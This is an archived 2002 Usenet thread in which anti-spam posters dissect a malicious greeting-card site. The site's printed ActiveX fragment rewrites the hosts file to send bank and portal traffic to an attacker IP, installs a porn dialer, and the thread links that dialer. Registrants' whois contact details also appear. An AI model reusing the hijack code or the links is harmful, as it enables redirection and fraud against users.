+    oFi.WriteLine("64.154.222.199 www.dell.com");
+    oFi.WriteLine("64.154.222.199 www.hp.com");
+    oFi.WriteLine("64.154.222.199 www.sony.com");
+    oFi.WriteLine("64.154.222.199 www.gateway.com");
+    oFi.WriteLine("64.154.222.199 www.ibm.com");
+    oFi.WriteLine("64.154.222.199 www.bestbuy.com");
+    oFi.WriteLine("64.154.222.199 www.prodigy.net");
+    oFi.WriteLine("64.154.222.199 www.att.com");
+    oFi.WriteLine("64.154.222.199 www.att.net");
+    oFi.WriteLine("64.154.222.199 www.earthlink.net");
+    oFi.WriteLine("64.154.222.199 www.earthlink.com");
+    oFi.WriteLine("64.154.222.199 www.mail.com");
+    oFi.WriteLine("64.154.222.199 www.lycos.com");
+    oFi.WriteLine("64.154.222.199 www.av.com");
+    oFi.WriteLine("64.154.222.199 www.mp3.com");
+    oFi.WriteLine("64.154.222.199 www.hollywood.com");
+    oFi.WriteLine("64.154.222.199 www.cnn.com");
+    oFi.WriteLine("64.154.222.199 www.nba.com");
+    oFi.WriteLine("64.154.222.199 www.nhl.com");
+    oFi.WriteLine("64.154.222.199 www.nfl.com");
+    oFi.WriteLine("64.154.222.199 www.usatoday.com");
+    oFi.WriteLine("64.154.222.199 www.weather.com");
+    oFi.WriteLine("64.154.222.199 www.money.com");
+    oFi.WriteLine("64.154.222.199 www.geocities.com");
+    oFi.WriteLine("64.154.222.199 www.amazon.com");
+    oFi.WriteLine("64.154.222.199 www.bankamerica.com");
+    oFi.WriteLine("64.154.222.199 www.wu.com");
+    oFi.WriteLine("64.154.222.199 www.westernunion.com");
+    oFi.WriteLine("64.154.222.199 www.c2it.com");
+    oFi.WriteLine("64.154.222.199 www.visa.com");
+    oFi.WriteLine("64.154.222.199 www.internet.com");
+    oFi.WriteLine("64.154.222.199 www.ivillage.com");
+    oFi.WriteLine("64.154.222.199 www.real.com");
+    oFi.WriteLine("64.154.222.199 www.x10.com");
+    oFi.WriteLine("64.154.222.199 www.about.com");
+    ...
+    oFi.Close();}
+=========================================================
+
+======================
+ORIGINAL SPAM: OMITTED
+======================
+
+[I think I got it right - but for this one, the LART was long -
+ but what can one do? Encrypted JavaScript, ActiveX,
+ Trojan hosts file, web connection stealing site, what it does
+ (porn dialer install) - I have to list and explain each of
+ those to some extent, at least.]
+
+
+From af380@chebucto.ns.ca Sat Feb 23 23:04:20 2002
+Status: RO
+X-Status: 
+From: spamless@nil.nil
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Quick action!
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c786644$1_2@nntp2.nac.net>
+Date: 23 Feb 2002 23:04:20 -0500
+X-Trace: nntp2.nac.net 1014523460 inch.com (23 Feb 2002 23:04:20 -0500)
+Lines: 41
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!netnews.com!xfer02.netnews.com!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766631
+
+Quick action from directNIC.com even on a Saturday night!
+
+spamless@Nil.nil wrote:
+
+> Do NOT go to ""http://Best-Greeting.com/" if you have IE, ActiveX,
+> scripting, etc. unless you would like your Web connection to be
+> stolen.
+
+> SPAMVERTIZED URL: "http://Best-Greeting.com/view.html?EFC9EWBKFJYAR"
+> --------------------------------------------------------------------
+
+>   ACTIVEX CODE:
+>   -----------------------------------------------------
+>   function savefavfile(folder,label,url,icofile,iconum)
+>    var oFi=FSO.CreateTextFile(folder+"\\hosts");
+>     oFi.WriteLine("64.154.222.199 hotmail.com");
+>     oFi.WriteLine("64.154.222.199 yahoo.com");
+>     ...
+>    [ETC. THE FULL LIST IS BELOW THE INDIVIDUALLY ADDRESSES
+>     SECTIONS]
+>     ...
+>     oFi.Close();}
+>   -----------------------------------------------------
+
+>   Let me guess what that does. It creates a "hosts" file.
+>   A "hosts" file is used (if it exists) to resolve hostnames
+>   (if the hostname is in the hosts file) before using a nameserver.
+>   So, if ever again, I try to go anywhere (well, not anywhere, but
+>   to any of the major sites listed below) I will be going to:
+>   "64.154.222.199"
+>   -----------------------------------------------------------
+
+Quick action:
+
+> Thanks for the information we have terminated the site Best-Greeting.com
+> at directNIC.com.
+
+Unfortunately, that is only the host that installs the Trojan "hosts" file.
+If/when the spammer notices that his site is down, he can put it up
+somewhere else and it will keep working. The site that steals one's
+Web connection on Level3 is the one that really has to be targeted.
+
+
+From af380@chebucto.ns.ca Sat Feb 23 21:47:01 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!sunqbc.risq.qc.ca!newsfeed.mathworks.com!nycmny1-snh1.gtei.net!washdc3-snh1.gtei.net!news.gtei.net!newsfeed0.news.atl.earthlink.net!news.atl.earthlink.net!news.mindspring.net!not-for-mail
+From: Mark G <bsbox@mindspring.com>
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Quick action!
+Date: Sat, 23 Feb 2002 21:47:01 -0800
+Organization: MindSpring Enterprises
+Lines: 23
+Message-ID: <3C787E55.5030407@mindspring.com>
+References: <3c7848db$1_1@nntp2.nac.net> <3c786644$1_2@nntp2.nac.net>
+NNTP-Posting-Host: d1.56.d3.d1
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Transfer-Encoding: 7bit
+X-Server-Date: 24 Feb 2002 04:46:18 GMT
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1
+X-Accept-Language: en-us
+Xref: News.Dal.Ca news.admin.net-abuse.email:766639
+
+spamless@nil.nil wrote:
+
+
+> 
+>>Thanks for the information we have terminated the site Best-Greeting.com
+>>at directNIC.com.
+>>
+> 
+> Unfortunately, that is only the host that installs the Trojan "hosts" file.
+> If/when the spammer notices that his site is down, he can put it up
+> somewhere else and it will keep working. The site that steals one's
+> Web connection on Level3 is the one that really has to be targeted.
+> 
+
+
+True, but since Best-greetings was the first stop in the chain, it will 
+take another spam run to re-establish the chain, won't it? Until then, 
+with nothing redirecting to the connection stealing site, it seems to 
+render that site relatively harmless.
+
+The problem is going to be finding out the new gateway site before too 
+many people get taken in.
+
+
+
+From af380@chebucto.ns.ca Sun Feb 24 02:16:26 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Quick action!
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3c786644$1_2@nntp2.nac.net> <3C787E55.5030407@mindspring.com>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c78934a$1_1@nntp2.nac.net>
+Date: 24 Feb 2002 02:16:26 -0500
+X-Trace: nntp2.nac.net 1014534986 inch.com (24 Feb 2002 02:16:26 -0500)
+Lines: 16
+Path: News.Dal.Ca!news2.muc.eurocyber.net!news.m-online.net!newsfeed.r-kom.de!newsfeed00.sul.t-online.de!t-online.de!news-spur1.maxwell.syr.edu!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766650
+
+Mark G <bsbox@mindspring.com> wrote:
+> spamless@nil.nil wrote:
+>> 
+>> Unfortunately, that is only the host that installs the Trojan "hosts" file.
+>> If/when the spammer notices that his site is down, he can put it up
+>> somewhere else and it will keep working. The site that steals one's
+>> Web connection on Level3 is the one that really has to be targeted.
+
+> True, but since Best-greetings was the first stop in the chain, it will 
+> take another spam run to re-establish the chain, won't it?
+
+Get another host for Best-greetings; go to the name server and set the
+new IP address (I haven't checked it).
+
+It's nice to know there are white-hats still around.
+Unfortunately, the site that steald the connection is on Level3.
+
+
+From af380@chebucto.ns.ca Sun Feb 24 02:51:29 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!news2.muc.eurocyber.net!fu-berlin.de!news.iif.hu!news.bme.hu!news.matavnet.hu!newsfeed.matavnet.hu!out.nntp.be!propagator-SanJose!in.nntp.be!newsfeed0.news.atl.earthlink.net!news.atl.earthlink.net!news.mindspring.net!not-for-mail
+From: "Mark G" <bsbox@mindspring.com>
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Quick action!
+Date: Sun, 24 Feb 2002 02:51:29 -0700
+Organization: MindSpring Enterprises
+Lines: 15
+Message-ID: <a5ad6a$ild$1@slb5.atl.mindspring.net>
+References: <3c7848db$1_1@nntp2.nac.net> <3c786644$1_2@nntp2.nac.net> <3C787E55.5030407@mindspring.com> <3c78934a$1_1@nntp2.nac.net>
+NNTP-Posting-Host: d1.56.cc.97
+X-Server-Date: 24 Feb 2002 09:53:14 GMT
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Newsreader: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Xref: News.Dal.Ca news.admin.net-abuse.email:766659
+
+
+<spamless@Nil.nil> wrote in message news:3c78934a$1_1@nntp2.nac.net...
+> Get another host for Best-greetings; go to the name server and set
+the
+> new IP address (I haven't checked it).
+
+My bad. Directnic is also a registrar. I had assumed that they were
+the registrar and host for best-greetings and had pulled it all.
+>
+> It's nice to know there are white-hats still around.
+> Unfortunately, the site that steald the connection is on Level3.
+
+Even level3 may react to something as blatant as this.
+
+
+
+
+From af380@chebucto.ns.ca Sun Feb 24 06:38:04 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!news2.muc.eurocyber.net!fu-berlin.de!news.maxwell.syr.edu!pln-e!spln!dex!extra.newsguy.com!newsp.newsguy.com!news2
+From: Tsu Dho Nimh <abacaxi@hotmail.com>
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Quick action!
+Date: Sun, 24 Feb 2002 06:38:04 -0700
+Organization: Hopelessly Dis
+Lines: 21
+Message-ID: <u3rh7u4ihjmn1oluilmsforlaktqvscham@4ax.com>
+References: <3c7848db$1_1@nntp2.nac.net> <3c786644$1_2@nntp2.nac.net> <3C787E55.5030407@mindspring.com> <3c78934a$1_1@nntp2.nac.net>
+NNTP-Posting-Host: p-374.newsdawg.com
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+X-Newsreader: Forte Agent 1.7/32.534
+Xref: News.Dal.Ca news.admin.net-abuse.email:766686
+
+spamless@Nil.nil wrote:
+
+
+>It's nice to know there are white-hats still around.
+>Unfortunately, the site that steald the connection is on Level3.
+
+Wasn't the FTC doing something about "browser-jacking"?  
+
+This is SO blatantly a violation of the various laws about
+messing with the computers of others that even Level3 might do
+something. 
+
+
+
+
+Tsu Dho Nimh
+
+-- 
+"Y'know, I can *say* I'm Ming The Merciless, Emporer of Planet Mongo, but 
+unless I can produce a few legions of heavily-armed rocket ships, you're not 
+likely to take me seriously."  Morely Dotes, 2001
+
+
+From af380@chebucto.ns.ca Sun Feb 24 15:11:45 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!novia!novia!teleglobe.net!teleglobe.net!teleglobe.net!66.185.86.143.MISMATCH!news03.bloor.is!news2.bloor.is.POSTED!12dc6cf53ab2750!not-for-mail
+Message-ID: <3C7902A7.A2E537CF@rogers.com>
+From: David Ramalho <earthscibbs@rogers.com>
+Organization: ***EarthScibbs***
+X-Mailer: Mozilla 4.79 [en] (Win95; U)
+X-Accept-Language: en,pdf
+MIME-Version: 1.0
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just 
+ received a greeting card!
+References: <3c7848db$1_1@nntp2.nac.net>
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Lines: 238
+Date: Sun, 24 Feb 2002 15:11:45 GMT
+NNTP-Posting-Host: 24.100.247.48
+X-Complaints-To: abuse@rogers.com
+X-Trace: news2.bloor.is 1014563505 24.100.247.48 (Sun, 24 Feb 2002 10:11:45 EST)
+NNTP-Posting-Date: Sun, 24 Feb 2002 10:11:45 EST
+Xref: News.Dal.Ca news.admin.net-abuse.email:766699
+
+spamless@Nil.nil wrote:
+> 
+> Do NOT go to ""http://Best-Greeting.com/" if you have IE, ActiveX,
+> scripting, etc. unless you would like your Web connection to be
+> stolen.
+> 
+> SPAMVERTIZED URL: "http://Best-Greeting.com/view.html?EFC9EWBKFJYAR"
+> --------------------------------------------------------------------
+>  Interesting. This page has:
+> 
+>    "Sorry,
+>     We are closed for scheduled maintance
+>     Please come back in a few hours to view and send your postcards"
+> 
+>  However, that is below the encrypted JavaScript section which does
+>  a document write (after decrypting) of:
+> 
+>   "var label="Free Bisexual Pics & Videos";     //Labelvar
+>    url="http://www.bitgp.com/";                 //To URLvar" ...
+> 
+>   What does it do? It uses ActiveX to do ... what?
+> 
+>   ACTIVEX CODE:
+>   -----------------------------------------------------
+>   function savefavfile(folder,label,url,icofile,iconum)
+>    var oFi=FSO.CreateTextFile(folder+"\\hosts");
+>     oFi.WriteLine("64.154.222.199 hotmail.com");
+>     oFi.WriteLine("64.154.222.199 yahoo.com");
+
+ < really big snip >
+
+http://64.154.222.199/ redirects to http://www.dryporn.com/index1.shtml?
+
+ Calling itself: BLIADI TGP
+Various sex galleries.  This pops up when you try to leave: http://x-wild.com/
+ Also it tries to get you to download an auto-dialer from here:
+     http://www.0190-dialer.com/autoload.cfm?5-1-26-55
+
+
+ Host name: www.dryporn.com
+IP address: 64.154.222.191
+     Alias: unknown.level3.net
+
+ Registrant:
+      Vladimir Satana
+      Satana
+      Mir 1
+      Tallinn, Not Applicable 10000
+      Estonia
+   Registrar: Go Daddy Software (http://registrar.godaddy.com)
+   Domain Name: DRYPORN.COM
+      Created on: 07-Feb-02
+      Expires on: 07-Feb-03
+      Last Updated on: 07-Feb-02
+   Administrative Contact:
+      Satana, Vladimir  vladimirtsastsin@hotmail.com
+      Satana
+      Mir 1
+      Tallinn, Not Applicable 10000
+      Estonia
+      (372) 666-6666      Fax -- (372) 666-6666
+   Technical Contact:
+      Satana, Vladimir  vladimirtsastsin@hotmail.com
+      Satana
+      Mir 1
+      Tallinn, Not Applicable 10000
+      Estonia
+      (372) 666-6666      Fax -- (372) 666-6666
+   Domain servers in listed order:
+      NS1.RALFHOST.COM
+      NS2.RALFHOST.COM
+----------------------------------------
+
+ Host name: ralfhost.com
+IP address: 64.154.222.180
+     Alias: unknown.level3.net
+
+  Whois: ralfhost.com
+domain:       ralfhost.com
+status:       production
+origin-c:     ralfinc@hotmail.com
+organization: Ralf inc.
+email:        ralfinc@hotmail.com#0
+address:      Roadster 15
+city:         Baltimore
+state:        MD
+postal-code:  MD 21297
+country:      US
+admin-c:      ralfinc@hotmail.com#0
+tech-c:       ralfinc@hotmail.com#0
+billing-c:    ralfinc@hotmail.com#0
+nserver:      ns1.ralfhost.com  64.154.222.180
+nserver:      ns2.ralfhost.com  64.154.222.181
+nserver:      ns.interframe.ee  
+nserver:      ns2.interframe.ee 
+registrar:    JORE-1
+created:      2001-10-01 22:53:56 UTC JORE-1
+modified:     2002-02-04 00:22:46 UTC JORE-1
+expires:      2002-10-01 16:53:43 UTC 
+source:       joker.com
+db-updated:   2002-02-24 15:18:20 UTC
+
+-----------------------------------------
+ Host name: x-wild.com
+IP address: 64.154.222.187
+     Alias: unknown.level3.net
+
+ Whois: x-wild.com
+domain:       x-wild.com
+status:       production
+origin-c:     vladimirtsastsin@hotmail.com
+owner:        Vladimir Tshashtshin
+email:        vladimirtsastsin@hotmail.com#0
+address:      rahu 14-8
+city:         Narva
+postal-code:  20606
+country:      EE
+admin-c:      vladimirtsastsin@hotmail.com#0
+tech-c:       vladimirtsastsin@hotmail.com#0
+billing-c:    vladimirtsastsin@hotmail.com#0
+nserver:      ns1.ralfhost.com  64.154.222.180
+nserver:      ns2.ralfhost.com  64.154.222.181
+nserver:      ns.interframe.ee  
+nserver:      ns2.interframe.ee 
+registrar:    JORE-1
+created:      2001-12-05 23:55:03 UTC JORE-1
+modified:     2002-02-04 00:16:47 UTC JORE-1
+expires:      2002-12-05 17:54:49 UTC 
+source:       joker.com
+db-updated:   2002-02-24 15:29:04 UTC
+
+------------------------------------
+ Host name: 0190-dialer.com
+IP address: 62.4.93.13
+No reverse lookup configured.
+
+   Whois: 0190-dialer.com
+domain:       0190-dialer.com
+status:       production
+origin-c:     hostmaster@wwwhosting.de
+organization: internet solutions gmbh
+email:        hostmaster@wwwhosting.de#1
+address:      Frankfurter Str. 1-5
+city:         Eschborn
+state:        Hessen
+postal-code:  65760
+country:      DE
+admin-c:      hostmaster@wwwhosting.de#1
+tech-c:       hostmaster@wwwhosting.de#1
+billing-c:    hostmaster@wwwhosting.de#0
+nserver:      ns.ipfb.net  
+nserver:      ns2.ipfb.net 
+registrar:    JORE-1
+created:      2000-09-29 09:04:31 UTC core
+expires:      2002-09-29 09:04:31 UTC 
+source:       joker.com
+db-updated:   2002-02-24 15:31:30 UTC 
+
+----------------------------------
+ Host name: wwwhosting.de
+IP address: 195.4.150.53
+     Alias: DELTA
+
+   whois: wwwhosting.de
+domain:      wwwhosting.de
+descr:       WWW-Hosting
+descr:       Frankfurter Str. 1-5
+descr:       65760 Eschborn
+descr:       Germany
+nserver:     ns.wwwhosting.de 62.104.45.11
+nserver:     ns2.wwwhosting.de 62.104.134.130
+status:      connect
+changed:     lastchange@denic.de 19991006
+source:      DENIC
+
+[admin-c]
+Type:         PERSON
+Name:         Robert Keen
+Address:      WWW-Hosting
+Address:      Frankfurter Str. 1-5
+City:         Eschborn
+Pcode:        65760
+Country:      DE
+Changed:      lastchange@denic.de 20000614
+Source:       DENIC
+
+[tech-c]
+Type:         PERSON
+Name:         Hostmaster Day
+Address:      WWW-Hosting
+Address:      Frankfurter Str. 1-5
+City:         Eschborn
+Pcode:        65760
+Country:      DE
+Phone:        +49 6196 4031880
+Fax:          +49 6196 4031881
+Email:        hostmaster@wwwhosting.de
+Changed:      lastchange@denic.de 20000323
+Source:       DENIC
+
+[zone-c]
+Type:         PERSON
+Name:         DNS Admin Role Account WWW-Hosting
+Address:      WWW-Hosting
+Address:      Frankfurter Str. 1-5
+City:         Eschborn
+Pcode:        65760
+Country:      DE
+Phone:        +49 6196 4031880
+Fax:          +49 6196 4031881
+Email:        dnsadmin@wwwhosting.de
+Changed:      lastchange@denic.de 20000323
+Source:       DENIC
+=================================
+
+ One interesting thing I found is this:
+
+ X-Wild wild teen galleries trade traffic form
+    http://www.x-wild.com/webmaster.php
+ If you have any questions, just email at my@email.com or icq at 221937
+
+      ICQ: 221937
+     name: Prime G.J
+   e-mail: 221937@pager.icq.com
+Languages:  Afrikaans, Punjabi and Urdu
+
+my@email.com is probably fake.
+
+ The ICQ number was recently used as contact point (Jan 24/02).
+http://www.celebritywebmaster.com/spamboard/ about 1/3 of the way down.
+-- copy --
+Teen CJ2 (30k hits daily - 1 exit console) searches someone to 
+share traffic with (1-7k daily trades).
+ ICQ: 221937
+-- end copy --
+
+ Regards
+ David Ramalho
+
+
+From af380@chebucto.ns.ca Sun Feb 24 10:37:43 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!newsflash.concordia.ca!nntp.cs.ubc.ca!logbridge.uoregon.edu!HSNX.atgi.net!peer1-sjc1.usenetserver.com!usenetserver.com!sn-xit-04!sn-post-01!supernews.com!corp.supernews.com!bill
+From: Bill Cole <bill@scconsult.com>
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just received a greeting card!
+Date: Sun, 24 Feb 2002 10:37:43 -0500
+Organization: scconsult.com is not organized
+Message-ID: <bill-1A3BAE.10374324022002@corp.supernews.com>
+References: <3c7847ff$1_1@nntp2.nac.net>
+User-Agent: MT-NewsWatcher/3.2 (PPC Mac OS X)
+X-Complaints-To: newsabuse@supernews.com
+Lines: 18
+Xref: News.Dal.Ca news.admin.net-abuse.email:766703
+
+In article <3c7847ff$1_1@nntp2.nac.net>,
+ John McGowan <jmcgowan@shell.inch.com> wrote:
+
+> Do NOT go to ""http://Best-Greeting.com/" if you have IE, ActiveX,
+> scripting, etc. unless you would like your Web connection to be
+> stolen.
+
+Do you really think anyone here is clueless enough to allow spamvertised 
+websites to drive MS Trojan Toolkit^W^W^WActiveX? 
+
+I don't use any MS-ware on my own systems, but when I must I kill off 
+ActiveX. If a site requires ActiveX and does not tell you so explicitly, 
+it should not be trusted to use ActiveX.
+
+-- 
+Bill Cole
+I don't speak for my current employer, much less my former ones. 
+That disclaimer will not change the minds of a few lunatics, of course... 
+
+
+From af380@chebucto.ns.ca Sun Feb 24 12:51:05 2002
+Status: RO
+X-Status: 
+From: spamless@nil.nil
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just  received a greeting card!
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net> <3C7902A7.A2E537CF@rogers.com>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c792809$1_1@nntp2.nac.net>
+Date: 24 Feb 2002 12:51:05 -0500
+X-Trace: nntp2.nac.net 1014573065 inch.com (24 Feb 2002 12:51:05 -0500)
+Lines: 45
+Path: News.Dal.Ca!news2.muc.eurocyber.net!uucp.gnuu.de!newsfeed.arcor-online.net!newsfeed.r-kom.de!newsfeed.freenet.de!newsfeed.wirehub.nl!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766744
+
+David Ramalho <earthscibbs@rogers.com> wrote:
+
+> http://64.154.222.199/ redirects to http://www.dryporn.com/index1.shtml?
+
+Yes, if you go there with the "Host:" field in the header set to something
+which is not in their database. If you go there via the "hosts" file the
+"Host:" field in the header will be used to create a frameset with the
+page you expect (provided their database has the correct IP address) in
+it (full frame - 100%) and a hidden frame for installing a porn dialer.
+
+Of course, that can change (once they have hijacked your browser, they
+can do whatever they desire with your browsing).
+
+>  Calling itself: BLIADI TGP
+> Various sex galleries.  This pops up when you try to leave: http://x-wild.com/
+>  Also it tries to get you to download an auto-dialer from here:
+>      http://www.0190-dialer.com/autoload.cfm?5-1-26-55
+
+Yep. The dialer it tries to get you to download is at:
+ 'http://download2.0190-dialer.com/dialers/5-1-26-55.exe'
+
+It is another dialer in this same directory that the hidden frame (if you get
+the "hosts" file installed) will keep trying to install.
+
+5-1-26-55.exe is a UPX compressed binary.
+
+From that file (after decompressing and looking inside it):
+
+ "WebDialer"
+ "In case of any problems with this service please e-mail 
+  service@ebs-ag.de or call +49 2173 2738 560."
+ "... gain access to this site by dialing this 900 telephone number..."
+ "Under penalty of perjury, I swear and affirm that ...
+  I am not a law enforcement agent or US Postal Official  or acting 
+  as an agent thereof ..."
+ "We are not responsible for any material you may view using this service."
+ "Once connected, your computer modem will not terminate this 900 telephone 
+  call unless and until:
+   -You terminate the connection ... or
+   -You stay connected for longer than Twelve (12) minutes or $50.00 per call, 
+    at which time you will automatically be disconnected..."
+
+>  Host name: www.dryporn.com
+> IP address: 64.154.222.191
+>      Alias: unknown.level3.net
+
+
+From af380@chebucto.ns.ca Sun Feb 24 12:57:43 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just received a greeting card!
+Newsgroups: news.admin.net-abuse.email
+References: <3c7847ff$1_1@nntp2.nac.net> <bill-1A3BAE.10374324022002@corp.supernews.com>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c792997$1_1@nntp2.nac.net>
+Date: 24 Feb 2002 12:57:43 -0500
+X-Trace: nntp2.nac.net 1014573463 inch.com (24 Feb 2002 12:57:43 -0500)
+Lines: 24
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766749
+
+Bill Cole <bill@scconsult.com> wrote:
+> In article <3c7847ff$1_1@nntp2.nac.net>,
+>  Spamless <spamless@nil.nil> wrote:
+
+>> Do NOT go to ""http://Best-Greeting.com/" if you have IE, ActiveX,
+>> scripting, etc. unless you would like your Web connection to be
+>> stolen.
+
+> Do you really think anyone here is clueless enough to allow spamvertised 
+> websites to drive MS Trojan Toolkit^W^W^WActiveX? 
+
+Not the regulars here. There are folk who get a new computer and
+get a "Surprise! You've just received a greeting card!" and off they
+go. It was spamvertized, so it is something we should be interested in
+and for the newbies who come here the warning is useful.
+
+In fact, at one time one of the semi-regulars here reported visiting
+a site which tried to install an "*hta" file to get a back-door Trojan
+(PsychWard_3, I believe) (ActiveX, etc.) - well, they did not know that,
+but were asking about the site. They *had* gotten it. So - it happens.
+
+> I don't use any MS-ware on my own systems, but when I must I kill off 
+> ActiveX. If a site requires ActiveX and does not tell you so explicitly, 
+> it should not be trusted to use ActiveX.
+
+
+From af380@chebucto.ns.ca Sun Feb 24 16:26:59 2002
+Status: RO
+X-Status: 
+From: spamless@nil.nil
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just received a greeting card!
+Newsgroups: news.admin.net-abuse.email
+References: <3c7848db$1_1@nntp2.nac.net>
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c795aa3$1_1@nntp2.nac.net>
+Date: 24 Feb 2002 16:26:59 -0500
+X-Trace: nntp2.nac.net 1014586019 inch.com (24 Feb 2002 16:26:59 -0500)
+Lines: 21
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766808
+
+I don't like cookies and this shows how dangerous it can be to use them for
+any privileged data.
+
+Suppose you have a bank account online.
+
+Suppose it uses a cookie (encrypted or not) with your bank account
+ information for automatic log-in.
+
+Suppose some scam artist manages to have your system resolve the URL for the
+ bank host machine to his IP address (by hacking your company's name server
+ and seeding the cache with bad information or by creating a "hosts" file on
+ your computer with his IP address set for the bank hostmachine).
+
+You go to your online bank - you think. It sends all cookie data for that
+hostname to the scam artist's machine. If the data is in clear text, he can
+read it. If it is encrypted, he can then go the the bank's host machine and
+submit the cookie data to access your account. If he has a copy of the
+bank's page on his machine, he may be able to convince you to enter private
+data.
+
+Using cookies for any privileged data is bad.
+
+
+From af380@chebucto.ns.ca Sun Feb 24 13:54:44 2002
+Status: RO
+X-Status: 
+Path: News.Dal.Ca!news2.muc.eurocyber.net!fu-berlin.de!feeder.qis.net!sn-xit-02!supernews.com!postnews1.google.com!not-for-mail
+From: solitaire5@juno.com (Sarah)
+Newsgroups: news.admin.net-abuse.email
+Subject: Re: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Quick action!
+Date: 24 Feb 2002 13:54:44 -0800
+Organization: http://groups.google.com/
+Lines: 54
+Message-ID: <d7f82a0.0202241354.574548d@posting.google.com>
+References: <3c7848db$1_1@nntp2.nac.net> <3c786644$1_2@nntp2.nac.net> <3C787E55.5030407@mindspring.com> <3c78934a$1_1@nntp2.nac.net>
+NNTP-Posting-Host: 172.138.217.183
+Content-Type: text/plain; charset=ISO-8859-1
+Content-Transfer-Encoding: 8bit
+X-Trace: posting.google.com 1014587687 2853 127.0.0.1 (24 Feb 2002 21:54:47 GMT)
+X-Complaints-To: groups-abuse@google.com
+NNTP-Posting-Date: 24 Feb 2002 21:54:47 GMT
+Xref: News.Dal.Ca news.admin.net-abuse.email:766811
+
+spamless@Nil.nil wrote in message news:<3c78934a$1_1@nntp2.nac.net>...
+> Mark G <bsbox@mindspring.com> wrote:
+> > spamless@nil.nil wrote:
+> >> 
+> >> Unfortunately, that is only the host that installs the Trojan "hosts" file.
+> >> If/when the spammer notices that his site is down, he can put it up
+> >> somewhere else and it will keep working. The site that steals one's
+> >> Web connection on Level3 is the one that really has to be targeted.
+>  
+> > True, but since Best-greetings was the first stop in the chain, it will 
+> > take another spam run to re-establish the chain, won't it?
+> 
+> Get another host for Best-greetings; go to the name server and set the
+> new IP address (I haven't checked it).
+
+whois -h whois.crsnic.net best-greetings.com ...
+Redirecting to BULKREGISTER.COM, INC.
+
+
+montmaneix 
+   5 route de saint cergues
+   mies, vaud 1295
+   CH
+
+   Domain Name: BEST-GREETINGS.COM
+
+   Administrative Contact:
+        montmaneix chris    montmaneix@hotmail.com
+        montmaneix
+        6 chemin de la poste
+        founex, vaud 1297
+        CH
+        Phone- +41794350568 
+        Fax- +41227766987
+   Technical Contact:
+        montmaneix chris  montmaneix@hotmail.com
+        montmaneix
+        6 chemin de la poste
+        founex, vaud 1297
+        CH
+        Phone- +41794350568 
+        Fax- +41227766987
+
+   Record updated on 2000-03-08 00:00:00.
+   Record created on 2000-03-08.
+   Record expires on 2002-03-08.
+   Database last updated on 2002-02-24 07:43:41 EST.
+
+   Domain servers in listed order:
+
